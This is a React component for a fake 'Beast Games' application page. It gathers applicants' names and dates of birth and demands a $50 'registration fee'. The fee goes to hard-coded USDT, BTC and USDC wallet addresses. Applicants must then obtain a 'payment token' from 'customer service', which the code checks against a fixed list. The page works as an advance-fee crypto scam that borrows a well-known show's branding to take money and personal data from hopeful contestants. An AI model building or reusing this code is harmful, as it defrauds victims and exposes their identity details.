import React, { useState } from 'react';
import { Copy } from 'lucide-react';
import beastIcon from '../assets/beast_games.png';
import Footer from './Footer';

const VALID_TOKENS = [
  'BEAST2025',
  'MRB12345',
  'WINNER50',
  'REGFEE2025'
];

const Apply = () => {
  const [form, setForm] = useState({
    firstName: '',
    lastName: '',
    dob: '',
    wallet: '',
    btc: '',
    usdc: '',
    token: ''
  });
  const [submitted, setSubmitted] = useState(false);
  const [copied, setCopied] = useState({ wallet: false, btc: false, usdc: false });
  const [showModal, setShowModal] = useState(false);
  const [awaitingToken, setAwaitingToken] = useState(false);
  const [tokenError, setTokenError] = useState('');

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const handleCopy = (field: string, value: string) => {
    navigator.clipboard.writeText(value);
    setCopied((prev) => ({ ...prev, [field]: true }));
    setTimeout(() => setCopied((prev) => ({ ...prev, [field]: false })), 1500);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!awaitingToken) {
      setShowModal(true);
      setAwaitingToken(true);
      return;
    }
    // Validate token
    if (!VALID_TOKENS.includes(form.token.trim())) {
      setTokenError('Invalid token. Please enter the correct payment token provided by customer service.');
      return;
    }
    setTokenError('');
    setSubmitted(true);
  };

  return (
    <div className="min-h-screen flex flex-col bg-black">
      {/* Header with logo */}
      <header className="w-full py-6 bg-black flex justify-center items-center border-b border-gray-800">
        <img src={beastIcon} alt="Beast Games Logo" className="h-12 w-auto" />
      </header>
      <main className="flex-grow flex flex-col items-center justify-center px-4 py-12">
        <div className="bg-gray-900 rounded-2xl shadow-lg p-8 w-full max-w-md">
          <h2 className="text-3xl font-bold text-center text-yellow-400 mb-8">Apply for Beast Games</h2>
          {submitted ? (
            <div className="text-green-400 text-center text-lg font-semibold">Thank you for applying! We will contact you soon.</div>
          ) : (
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label className="block text-gray-300 mb-2" htmlFor="firstName">First Name</label>
                <input
                  type="text"
                  id="firstName"
                  name="firstName"
                  value={form.firstName}
                  onChange={handleChange}
                  required
                  className="w-full px-4 py-2 rounded-lg bg-black text-white border border-gray-700 focus:outline-none focus:border-yellow-400"
                />
              </div>
              <div>
                <label className="block text-gray-300 mb-2" htmlFor="lastName">Last Name</label>
                <input
                  type="text"
                  id="lastName"
                  name="lastName"
                  value={form.lastName}
                  onChange={handleChange}
                  required
                  className="w-full px-4 py-2 rounded-lg bg-black text-white border border-gray-700 focus:outline-none focus:border-yellow-400"
                />
              </div>
              <div>
                <label className="block text-gray-300 mb-2" htmlFor="dob">Date of Birth</label>
                <input
                  type="date"
                  id="dob"
                  name="dob"
                  value={form.dob}
                  onChange={handleChange}
                  required
                  className="w-full px-4 py-2 rounded-lg bg-black text-white border border-gray-700 focus:outline-none focus:border-yellow-400"
                />
              </div>
              <div>
                <label className="block text-yellow-400 mb-1 font-semibold">Warning: Send only TRC20 USDT to the below wallet address!</label>
                <label className="block text-gray-300 mb-2" htmlFor="wallet">USDT Wallet Address</label>
                <div className="relative flex items-center">
                  <input
                    type="text"
                    id="wallet"
                    name="wallet"
                    value={form.wallet || 'TKePDkw1K3s994imJogqKDaAUkPp1weQQU'}
                    onChange={handleChange}
                    placeholder="TKePDkw1K3s994imJogqKDaAUkPp1weQQU"
                    required
                    className="w-full px-4 py-2 rounded-lg bg-black text-white border border-gray-700 focus:outline-none focus:border-yellow-400 pr-12"
                  />
                  <button
                    type="button"
                    onClick={() => handleCopy('wallet', form.wallet)}
                    className="absolute right-2 top-1/2 -translate-y-1/2 p-1 text-yellow-400 hover:text-yellow-300"
                    tabIndex={-1}
                  >
                    <Copy className="h-5 w-5" />
                  </button>
                  {copied.wallet && <span className="absolute right-10 top-1/2 -translate-y-1/2 text-green-400 text-xs">Copied!</span>}
                </div>
              </div>
              <div>
                <label className="block text-yellow-400 mb-1 font-semibold">Warning: Send only BTC to the below wallet address!</label>
                <label className="block text-gray-300 mb-2" htmlFor="btc">BTC Wallet Address</label>
                <div className="relative flex items-center">
                  <input
                    type="text"
                    id="btc"
                    name="btc"
                    value={form.btc || 'bc1qhu6dev5nh8d3ufhqsueha4ntgplq73k85u89zw'}
                    onChange={handleChange}
                    placeholder="bc1qhu6dev5nh8d3ufhqsueha4ntgplq73k85u89zw"
                    className="w-full px-4 py-2 rounded-lg bg-black text-white border border-gray-700 focus:outline-none focus:border-yellow-400 pr-12"
                  />
                  <button
                    type="button"
                    onClick={() => handleCopy('btc', form.btc || '')}
                    className="absolute right-2 top-1/2 -translate-y-1/2 p-1 text-yellow-400 hover:text-yellow-300"
                    tabIndex={-1}
                  >
                    <Copy className="h-5 w-5" />
                  </button>
                  {copied.btc && <span className="absolute right-10 top-1/2 -translate-y-1/2 text-green-400 text-xs">Copied!</span>}
                </div>
              </div>
              <div>
                <label className="block text-yellow-400 mb-1 font-semibold">Warning: Send only USDC trc20 network to the below wallet address!</label>
                <label className="block text-gray-300 mb-2" htmlFor="usdc">USDC Wallet Address</label>
                <div className="relative flex items-center">
                  <input
                    type="text"
                    id="usdc"
                    name="usdc"
                    value={form.usdc || 'TKePDkw1K3s994imJogqKDaAUkPp1weQQU'}
                    onChange={handleChange}
                    placeholder="TKePDkw1K3s994imJogqKDaAUkPp1weQQU"
                    className="w-full px-4 py-2 rounded-lg bg-black text-white border border-gray-700 focus:outline-none focus:border-yellow-400 pr-12"
                  />
                  <button
                    type="button"
                    onClick={() => handleCopy('usdc', form.usdc || '')}
                    className="absolute right-2 top-1/2 -translate-y-1/2 p-1 text-yellow-400 hover:text-yellow-300"
                    tabIndex={-1}
                  >
                    <Copy className="h-5 w-5" />
                  </button>
                  {copied.usdc && <span className="absolute right-10 top-1/2 -translate-y-1/2 text-green-400 text-xs">Copied!</span>}
                </div>
              </div>
              <div>
                <label className="block text-gray-300 mb-2" htmlFor="token">
                  Token <span className="text-red-500">*</span>
                  <span className="ml-2 text-blue-400 font-medium">(Get payment token from customer service)</span>
                </label>
                <input
                  type="text"
                  id="token"
                  name="token"
                  value={form.token || ''}
                  onChange={handleChange}
                  required={awaitingToken}
                  placeholder="Enter your payment token"
                  className="w-full px-4 py-2 rounded-lg bg-black text-white border border-gray-700 focus:outline-none focus:border-yellow-400"
                />
                {tokenError && <span className="text-red-500 text-xs mt-1 block">{tokenError}</span>}
              </div>
              <div className="flex items-center justify-between bg-yellow-100 rounded-lg px-4 py-3">
                <span className="text-black font-semibold">Registration Fee</span>
                <span className="text-yellow-600 font-bold text-lg">$50</span>
              </div>
              <button
                type="submit"
                className="w-full py-3 bg-yellow-400 text-black font-bold rounded-full hover:bg-yellow-300 transition-colors text-lg mt-2"
              >
                Submit Application
              </button>
            </form>
          )}
        </div>
      </main>
      <Footer />
      {/* Modal for payment receipt prompt */}
      {showModal && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-60 z-50">
          <div className="bg-white rounded-lg shadow-lg p-8 max-w-sm w-full text-center">
            <h3 className="text-xl font-bold mb-4 text-yellow-600">Get Your Payment Token</h3>
            <p className="mb-6 text-gray-800">Please send the receipt of your registration payment to customer service. You will receive a payment token to enter here and complete your application.</p>
            <button
              className="px-6 py-2 bg-yellow-400 text-black font-semibold rounded hover:bg-yellow-300 transition-colors"
              onClick={() => setShowModal(false)}
            >
              Close
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default Apply;
